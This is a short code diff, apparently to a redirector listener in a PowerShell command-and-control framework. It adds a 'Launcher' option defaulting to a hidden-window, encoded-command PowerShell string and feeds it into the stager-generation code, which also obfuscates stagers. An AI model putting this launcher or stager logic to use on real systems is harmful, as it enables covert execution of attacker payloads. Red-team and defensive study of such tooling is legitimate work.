@@ -42,6 +42,11 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Launcher' : {
+                'Description'   :   'Launcher string.',
+                'Required'      :   True,
+                'Value'         :   'powershell -noP -w 1 -enc '
+            },
             'RedirectStagingKey' : {
                 'Description'   :   'The staging key for the redirect listener, extracted from RedirectListener automatically.',
                 'Required'      :   False,
@@ -110,6 +115,7 @@ class Listener:
             # extract the set options for this instantiated listener
             listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
             host = listenerOptions['Host']['Value']
+            launcher = listenerOptions['Launcher']['Value']
             stagingKey = listenerOptions['RedirectStagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
@@ -186,7 +192,7 @@ class Listener:
                     stager = helpers.obfuscate(stager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
-                    return helpers.powershell_launcher(stager)
+                    return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
                     return stager
